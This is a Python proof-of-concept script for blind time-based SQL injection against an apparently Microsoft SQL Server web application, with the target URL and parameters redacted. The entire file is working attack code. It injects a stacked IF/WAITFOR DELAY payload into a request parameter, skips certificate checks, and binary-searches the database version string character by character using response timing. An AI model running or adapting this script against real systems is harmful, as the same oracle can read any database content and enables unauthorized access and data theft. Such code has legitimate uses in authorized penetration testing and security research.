```python
#!/usr/bin/env python3
"""
Blind time-based SQLi extraction PoC.
Extracts @@version character-by-character via binary search
using WAITFOR DELAY as an oracle.

Usage:
    python3 extract_version.py
"""

import requests
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = "<REDACTED_TARGET_URL>"

DELAY = 3
THRESHOLD = DELAY * 0.7
MAX_LEN = 40
TIMEOUT = DELAY + 15


def _oracle_once(condition_sql: str) -> bool:
    """Classifies a SQL condition using response timing."""
    payload = (
        f"DE01';IF({condition_sql}) "
        f"WAITFOR DELAY '0:0:{DELAY}'--"
    )

    params = {
        "viewId": 32,
        "<REDACTED_PARAMETER>": "<REDACTED_VALUE>",
        "<REDACTED_INJECTION_PARAMETER>": payload,
    }

    start = time.time()

    try:
        requests.get(
            BASE_URL,
            params=params,
            verify=False,
            timeout=TIMEOUT,
        )
    except requests.exceptions.ReadTimeout:
        return True

    elapsed = time.time() - start
    return elapsed >= THRESHOLD


def oracle(condition_sql: str, votes: int = 3) -> bool:
    """Uses majority voting to reduce timing noise."""
    true_count = 0
    false_count = 0
    needed = votes // 2 + 1

    for _ in range(votes):
        if _oracle_once(condition_sql):
            true_count += 1
        else:
            false_count += 1

        if true_count >= needed:
            return True

        if false_count >= needed:
            return False

    return true_count > false_count


def get_length() -> int:
    """Binary-searches the length of @@VERSION."""
    lo, hi = 1, 128

    while lo < hi:
        mid = (lo + hi) // 2

        if oracle(
            f"LEN(CAST(@@VERSION AS VARCHAR(4000)))>{mid}"
        ):
            lo = mid + 1
        else:
            hi = mid

    return lo


def get_char(position: int) -> str:
    """Extracts one printable ASCII character."""
    lo, hi = 32, 126

    while lo < hi:
        mid = (lo + hi) // 2

        condition = (
            "ASCII(SUBSTRING("
            "CAST(@@VERSION AS VARCHAR(4000)),"
            f"{position},1))>{mid}"
        )

        if oracle(condition):
            lo = mid + 1
        else:
            hi = mid

    return chr(lo)


def main():
    print("[*] Checking the timing oracle...")

    is_true = oracle("1=1")
    is_false = oracle("1=2")

    print(f"    1=1 -> delayed: {is_true}")
    print(f"    1=2 -> delayed: {is_false}")

    if not (is_true and not is_false):
        print("[!] Oracle did not behave as expected.")
        return

    print("[*] Extracting @@VERSION length...")

    length = min(get_length(), MAX_LEN)
    print(f"    Length (capped at {MAX_LEN}): {length}")

    extracted = ""

    print("[*] Extracting characters:")

    for i in range(1, length + 1):
        c = get_char(i)
        extracted += c
        print(
            f"    [{i}/{length}] -> {c!r} "
            f"(so far: {extracted!r})"
        )

    print()
    print(f"[+] Extracted @@VERSION: {extracted!r}")


if __name__ == "__main__":
    main()
```
